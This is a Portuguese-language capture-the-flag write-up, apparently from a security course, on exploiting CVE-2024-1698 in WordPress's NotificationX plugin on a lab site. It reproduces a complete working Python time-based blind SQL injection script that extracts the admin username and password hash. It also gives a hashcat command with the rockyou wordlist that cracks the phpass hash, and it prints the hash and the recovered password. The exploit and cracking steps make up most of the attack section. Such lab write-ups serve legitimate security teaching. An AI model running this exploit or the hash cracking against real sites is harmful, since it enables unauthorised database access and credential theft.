# CTF Semana #8 (SQL Injection)

Este documento apresenta as etapas seguidas para a realização de um ataque a um site Wordpress utilizando a injeção de comandos SQL.

## 1. Reconhecimento

A página web que estamos a tentar atacar trata-se de uma página wordpress na versão 6.7. Observando o website, encontramos imediatamente uma mensagem popup escrita por alguém que hackeou o sistema (Figura 1).

![Figura 1](/Images/CTF8/Figura1.png)

Figura 1: mensagem popup lançada quando abrimos o website.

Este popup também indica que está instalado no website o plugin `NotificationX`, que é responsável por lançar a notificação.

Se carregarmos no popup, conseguimos ver o conteúdo total da mensagem deixada pelo hacker (Figura 2). Assim, conseguimos perceber que a hash da palavra passe de que estamos à procura começa por $P$B, o que indica que a política de armazenamento de palavras-passe do servidor utiliza o algorítmo `phpass`! 

![Figura 2](/Images/CTF8/Figura2.png)

Figura 2: pista deixada pelo hacker relativamente à palavra passe do admin.


## 2. Pesquisa por Vulnerabilidades

Começamos por procurar por vulnerabilidades em fontes públicas como CVE (Common Vulnerabilities and Exposures) do tipo SQL Injection associadas à versão 6.7 do Wordpress. Encontramos o [CVE-2021-24748](https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-email-before-download-sql-injection-6-7/) relacionado com o plugin `Email Before Download`. No entanto, após procurarmos extensivamente no website, percebemos que este plugin não estava instalado e que esta não poderia ser a vulnerabilidade. 

Pesquisamos de seguida vulnerabilidades SQL Injection associadas ao plugin que sabemos que está instalado: o `NotificationX`. Encontramos a vulnerabilidade [CVE-2024-1698](https://nvd.nist.gov/vuln/detail/cve-2024-1698), em que o plugin (até à versão 2.8.2) está vulnerável a SQL Injection através do parâmetro `type`, permitindo que atacantes consigam aceder a valores da base de dados. 

## 3. Escolha da Vulnerabilidade

Fazendo o inspect da página web e pesquisando por "plugin", encontramos que a versão do plugin `NotificationX` é a 2.8.1 (Figura 3). Esta versão é inferior à 2.8.2, o que significa que a página de wordpress está vulnerável ao [CVE-2024-1698](https://nvd.nist.gov/vuln/detail/cve-2024-1698)!

![Figura 3](/Images/CTF8/Figura3.png)

Figura 3: versão do plugin `NotificationX`.


## 4. Encontrar um Exploit

Para explorar esta vulnerabilidade fizemos uma pesquisa e encontramos um [repositório GitHub](https://github.com/kamranhasan/CVE-2024-1698-Exploit) com um possível exploit para este CVE! Esta é uma ferramenta que permite automatizar a execução de comandos SQL para extrair informações da base de dados. 

Fizemos a alteração do url para o endpoint vulnerável do nosso wordpress: http://44.242.216.18:5008/wp-json/notificationx/v1/analytics.

```Python
import requests
import string
from sys import exit

# Sleep time for SQL payloads
delay = 45

# URL for the NotificationX Analytics API
url = "http://44.242.216.18:5008/wp-json/notificationx/v1/analytics"

admin_username = ""
admin_password_hash = ""

session = requests.Session()

# Find admin username length
username_length = 0
for length in range(1, 41):  # Assuming username length is less than 40 characters
    resp_length = session.post(url, data={
        "nx_id": 1337,
        "type": f"clicks`=IF(LENGTH((select user_login from wp_users where id=1))={length},SLEEP({delay}),null)-- -"
    })

    # Elapsed time > delay if delay happened due to SQLi
    if resp_length.elapsed.total_seconds() > delay:
        username_length = length
        print("Admin username length:", username_length)
        break

# Find admin username
for idx_username in range(1, username_length + 1):
    # Iterate over all the printable characters + NULL byte
    for ascii_val_username in (b"\x00" + string.printable.encode()):
        # Send the payload
        resp_username = session.post(url, data={
            "nx_id": 1337,
            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_login from wp_users where id=1),{idx_username},1))={ascii_val_username},SLEEP({delay}),null)-- -"
        })

        # Elapsed time > delay if delay happened due to SQLi
        if resp_username.elapsed.total_seconds() > delay:
            admin_username += chr(ascii_val_username)
            # Show what we have found so far...
            print("Admin username:", admin_username)
            break  # Move to the next character
    else:
        # Null byte reached, break the outer loop
        break

# Find admin password hash
for idx_password in range(1, 41):  # Assuming the password hash length is less than 40 characters
    # Iterate over all the printable characters + NULL byte
    for ascii_val_password in (b"\x00" + string.printable.encode()):
        # Send the payload
        resp_password = session.post(url, data={
            "nx_id": 1337,
            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),{idx_password},1))={ascii_val_password},SLEEP({delay}),null)-- -"
        })

        # Elapsed time > delay if delay happened due to SQLi
        if resp_password.elapsed.total_seconds() > delay:
            admin_password_hash += chr(ascii_val_password)
            # Show what we have found so far...
            print("Admin password hash:", admin_password_hash)
            # Exit condition - encountered a null byte
            if ascii_val_password == 0:
                print("[*] Admin credentials found:")
                print("Username:", admin_username)
                print("Password hash:", admin_password_hash)
                exit(0)
```

## 5. Explorar a Vulnerabilidade

Executando o payload, conseguimos obter a hash da password do admin, `$P$BuRuB0Mi3926H8h.hcA3pSrUPyq0o10` (Figura 4)!

![Figura 4](/Images/CTF8/Figura4.png)

Figura 4: hash da password do admin como resultado do exploit.

No entanto, este ainda não é o valor da flag. É apenas a hash da password. E como podemos ver, a hash começa de facto por `$P$B`, confirmando que o modo de hash é o `phpass`.

O armazenamento de uma palavra-passe como hash melhora a segurança, uma vez que teoricamente o hashing é irreversível. No entanto, não é completamente seguro, uma vez que se podem realizar, por exemplo, ataques de brute force para encontrar a palavra-passe original. E foi isso mesmo que fizemos utilizando uma wordlist (`rockyou.txt`) e uma ferramenta que automatiza o processo de reverter funções de hash para palavras-passe chamada Hashcat.

Assim, utlizamos o Hashcat com as seguintes configurações:

1. Configuramos o modo de hash para o tipo `phpass`: `-m 400`.

2. Utilizamos a wordlist `rockyou.txt`, que contém uma coleção de passwords comuns (o hacker também nos deixou esta pista através do link da música no youtube!).

3. Colocamos a hash no ficheiro `flag.txt`.

O comando executado foi:

```
hashcat -m 400 -a 0 flag.txt rockyou.txt
```

E conseguimos por fim obter a flag deste CTF: `heartbroken` (Figura 5)!

![Figura 5](/Images/CTF8/Figura5.png)

Figura 5: obtenção da flag utilizando o hascat.